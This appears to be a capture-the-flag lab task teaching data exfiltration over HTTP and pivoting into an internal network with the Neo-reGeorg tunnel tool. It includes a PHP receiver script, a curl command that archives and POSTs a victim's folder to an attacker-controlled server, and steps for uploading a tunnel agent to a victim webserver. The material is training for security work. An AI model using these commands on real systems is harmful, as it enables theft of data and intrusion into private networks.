Before going further, ensure that you have the fundamental knowledge of network protocols before diving into this task and the upcoming tasks.

This task explains how to use the HTTP/HTTPS protocol to exfiltrate data from a victim to an attacker's machine. As a requirement for this technique, an attacker needs control over a webserver with a server-side programming language installed and enabled. We will show a PHP-based scenario in this task, but it can be implemented in any other programming language, such as python, Golang, NodeJS, etc.  

HTTP POST Request

Exfiltration data through the HTTP protocol is one of the best options because it is challenging to detect. It is tough to distinguish between legitimate and malicious HTTP traffic. We will use the POST HTTP method in the data exfiltration, and the reason is with the GET request, all parameters are registered into the log file. While using POST request, it doesn't. The following are some of the POST method benefits:

-   POST requests are never cached
-   POST requests do not remain in the browser history
-   POST requests cannot be bookmarked
-   POST requests have no restrictions on **data length**

Let's login to theweb.thm.com machine using thm:tryhackme credentials and inspect the Apache log file with two HTTP requests, one for the GET and the other for the POST, and check what they look like!

Inspecting the Apache log file  

```
thm@jump-box:~$ ssh thm@web.thm.com 

thm@web-thm:~$ sudo cat /var/log/apache2/access.log 

[sudo] password for thm: 10.10.198.13 - - [22/Apr/2022:12:03:11 +0100] "GET /example.php?file=dGhtOnRyeWhhY2ttZQo= HTTP/1.1" 200 147 "-" "curl/7.68.0" 10.10.198.13 - - [22/Apr/2022:12:03:25 +0100] "POST /example.php HTTP/1.1" 200 147 "-" "curl/7.68.0"
```

Obviously, the first line is a GET request with a file parameter with exfiltrated data. If you try to decode it using the based64 encoding, you would get the transmitted data, which in this case is thm:tryhackme. While the second request is a POST to example.php, we sent the same base64 data, but it doesn't show what data was transmitted.

The base64 data in your access.log looks different, doesn't it? Decode it to find the Flag for Question 1 below.  

In a typical real-world scenario, an attacker controls a web server in the cloud somewhere on the Internet. An agent or command is executed from a compromised machine to send the data outside the compromised machine's network over the Internet into the webserver. Then an attacker can log in to a web server to get the data, as shown in the following figure.  

![Typical HTTP Data Exifltration](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/789a9a13d9977b11d11f53bb7dbb9f3a.png)  

HTTP Data Exfiltration

Based on the attacker configuration, we can set up either HTTP or HTTPS, the encrypted version of HTTP. We also need a PHP page that handles the POST HTTP request sent to the server.

We will be using the HTTP protocol (not the HTTPS) in our scenario. Now let's assume that an attacker controls the web.thm.com server, and sensitive data must be sent from the JumpBox or  victim1.thm.com machine in our Network 2 environment (192.168.0.0/24).  

To exfiltrate data over the HTTP protocol, we can apply the following steps:

1.  An attacker sets up a web server with a data handler. In our case, it will be web.thm.com and the contact.php page as a data handler.
2.  A C2 agent or an attacker sends the data. In our case, we will send data using the curl command.
3.  The webserver receives the data and stores it. In our case, the contact.php receives the POST request and stores it into /tmp.
4.  The attacker logs into the webserver to have a copy of the received data.

Let's follow and apply what we discussed in the previous steps. Remember, since we are using the HTTP protocol, the data will be sent in cleartext. However, we will be using other techniques (tar and base64) to change the data's string format so that it wouldn't be in a human-readable format!

First, we prepared a webserver with a data handler for this task. The following code snapshot is of PHP code to handle POST requests via a file parameter and stores the received data in the /tmp directory as http.bs64 file name.

```php
<?php 
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
   }
?>
```

Now from the **Jump** machine, connect to the victim1.thm.com machine via SSH to exfiltrate the required data over the HTTP protocol. Use the following SSH credentials: thm:tryhackme.

Connecting to Victim1 machine from Jump Box  

```
thm@jump-box:~$ ssh thm@victim1.thm.com
```

You can also connect to it from AttackBox using port 2022 as follow,

Connecting to Victim1 machine from AttackBox  

```
thm@attacker$ ssh thm@10.10.34.65 -p 2022
```

The goal is to transfer the folder's content, stored in /home/thm/task6, to another machine over the HTTP protocol.

Checking the Secret folder!  

```
thm@victim1:~$ ls -l total 12 drwxr-xr-x 1 root root 4096 Jun 19 19:44 task4 drwxr-xr-x 1 root root 4096 Jun 19 19:44 task5 drwxr-xr-x 1 root root 4096 Jun 19 19:44 task6 drwxr-xr-x 1 root root 4096 Jun 19 19:43 task9
```

Now that we have our data, we will be using the curl command to send an HTTP POST request with the content of the secret folder as follows,

Sending POST data via CURL  

 ```
 thm@victim1:~$ curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php
 ```

We used the curl command with --data argument to send a POST request via the file parameter. Note that we created an archived file of the secret folder using the tar command. We also converted the output of the tar command into base64 representation.

Next, from the **victim1 or JumpBox** machine, let's log in to the webserver, web.thm.com, and check the /tmp directory if we have successfully transferred the required data. Use the following SSH credentials in order to login into the web: thm:tryhackme.

Checking the received data  

```
thm@victim1:~$ ssh thm@web.thm.com 

```

```
thm@web:~$ ls -l /tmp/ total 4 -rw-r--r-- 1 www-data www-data 247 Apr 12 16:03 http.bs64 

thm@web:~$ cat /tmp/http.bs64 

H4sIAAAAAAAAA 3ROw7CMBBFUddZhVcA/sYSHUuJSAoKMLKNYPkkgSriU1kIcU/hGcsuZvTysEtD< WYua1Ch4P9fRss69dsZ4E6wNTiitlTdC qpTPZxz6ZKUIsVY3v379P6j8j3/8ejzqlyrrDgF3Dr3 On/XLvI3QVshVY1hlv48/64/7I bU5fzJaa 2c5XbazzbTOtvCkxpubbUwIAAAAAAAAAAAAAAAB4 5gZKZxgrACgAAA==

```

Nice! We have received the data, but if you look closely at the http.bs64 file, you can see it is broken base64. This happens due to the URL encoding over the HTTP. The + symbol has been replaced with empty spaces, so let's fix it using the sed command as follows,

Fixing the http.bs64 file!  

```
thm@web:~$ sudo sed -i 's/ /+/g' /tmp/http.bs64
```

Using the sed command, we replaced the spaces with + characters to make it a valid base64 string!

Restoring the Data

```
thm@web:~$ cat /tmp/http.bs64 | base64 -d | tar xvfz - tmp/task6/ tmp/task6/creds.txt
```

Finally, we decoded the base64 string using the base64 command with -d argument, then we passed the decoded file and unarchived it using the tar command.

HTTPS Communications

In the previous section, we showed how to perform Data Exfiltration over the HTTP protocol which means all transmitted data is in cleartext. One of the benefits of HTTPS is encrypting the transmitted data using SSL keys stored on a server.

If you apply the same technique we showed previously on a web server with SSL enabled, then we can see that all transmitted data will be encrypted. We have set up our private HTTPS server to show what the transmitted data looks like. If you are interested in setting up your own HTTPS server, we suggest visiting the [Digital Ocean website](https://www.digitalocean.com/community/tutorials/how-to-create-a-self-signed-ssl-certificate-for-apache-in-ubuntu-18-04).  

![HTTPS traffic in Wireshark](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/fbf6c90063102ca100ba8d544ba9d7f8.png)  

As shown in the screenshot, we captured the network traffic and it seems that all client and server communications on port 443 are encrypted.

HTTP Tunneling

Tunneling over the HTTP protocol technique encapsulates other protocols and sends them back and forth via the HTTP protocol. HTTP tunneling sends and receives many HTTP requests depending on the communication channel!

Before diving into HTTP tunneling details, let's discuss a typical scenario where many internal computers are not reachable from the Internet. For example, in our scenario, the uploader.thm.com server is reachable from the Internet and provides web services to everyone. However, the app.thm.com server runs locally and provides services only for the internal network as shown in the following figure:   

![HTTP Tunneling](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/92004a7c6a572f9680f0056b9aa88baa.png)

In this section, we will create an HTTP tunnel communication channel to pivot into the internal network and communicate with local network devices through HTTP protocol. Let's say that we found a web application that lets us upload an HTTP tunnel agent file to a victim webserver, uploader.thm.com. Once we upload and connect to it, we will be able to communicate with app.thm.com. 

For HTTP Tunneling, we will be using a [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg) tool to establish a communication channel to access the internal network devices. We have installed the tool in AttackBox, and it can be found in the following location:

Neo-reGeorg Path on AttackBox  

           
```
root@AttackBox:/opt/Neo-reGeorg#

```
Next, we need to generate an encrypted client file to upload it to the victim web server as follows,

Generating encrypted Tunneling Clients with a selected password!  

```
root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py generate -k thm  

"$$$$$$''  'M$  '$$$@m         :$$$$$$$$$$$$$$''$$$$'        '$'    'JZI'$$&  $$$$'                  '$$$  '$$$$                  $$$$  J$$$$'                 m$$$$  $$$$,                 $$$$@  '$$$$_          Neo-reGeorg              '1t$$$$' '$$$$<           '$$$$$$$$$$'  $$$$          version 3.8.0                '@$$$$'  $$$$'                 '$$$$  '$$$@              'z$$$$$$  @$$$                 r$$$   $$|                 '$$v c$$                '$$v $$v$$$$$$$$$#                $$x$$$$$$$$$twelve$$$@$'              @$$$@L '    '<@$$$$$$$$`            $$                 '$$$       [ Github ] https://github.com/L-codes/neoreg      [+] Mkdir a directory: neoreg_servers     [+] Create neoreg server files:        => neoreg_servers/tunnel.aspx        => neoreg_servers/tunnel.ashx        => neoreg_servers/tunnel.jsp        => neoreg_servers/tunnel_compatibility.jsp        => neoreg_servers/tunnel.jspx        => neoreg_servers/tunnel_compatibility.jspx        => neoreg_servers/tunnel.php

```


The previous command generates encrypted Tunneling clients with thm key in the neoreg_servers/ directory. Note that there are various extensions available, including PHP, ASPX, JSP, etc. In our scenario, we will be uploading the tunnel.php file via the uploader machine. To access the uploader machine, you can visit the following URL: http://10.10.34.65/uploader or https://10-10-34-65.p.thmlabs.com/uploader without the need for a VPN.

![The Victim's uploader](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/2445ab5b8bc971b51f8ebe3ffbd0c07d.png)

To upload the PHP file, use admin as the key to let you upload any files into the uploader.thm.com. Once we have uploaded the file, we can access it on the following URL: http://10.10.34.65/uploader/files/tunnel.php.

Creating an HTTP Tunnel  

 ```
 root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py -k thm -u http://10.10.34.65/uploader/files/tunnel.php
 ```
 

We need to use the neoreg.py to connect to the client and provide the key to decrypt the tunneling client. We also need to provide a URL to the PHP file that we uploaded on the uploader machine.

Once it is connected to the tunneling client, we are ready to use the tunnel connection as a proxy binds on our local machine, 127.0.0.1, on port 1080.

For example, if we want to access the app.thm.com, which has an internal IP address 172.20.0.121 on port 80, we can use the curl command with --socks5 argument. We can also use other proxy applications, such as ProxyChains, FoxyProxy, etc., to communicate with the internal network. 

Access the app.thm.com machine via the HTTP Tunneling  

```
root@AttackBox:~$ curl --socks5 127.0.0.1:1080 http://172.20.0.121:80 Welcome to APP Server!
```

The following diagram shows the traffic flow as it goes through the uploader machine and then communicates with the internal network devices, which in this case, is the App machine. Note that if we check the network traffic from the App machine, we see that the source IP address of incoming traffic comes from the uploader machine.

![HTTP Tunneling diagram](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b32d6d9d9c3377acf155044204ec6982.png)  

Now replicate the HTTP Tunneling steps to establish tunneling over the HTTP protocol to communicate with flag.thm.com with 172.20.0.120 as an IP address on port 80. Note that if you access the flag.thm.com website from other machines within the network, you won't get the flag.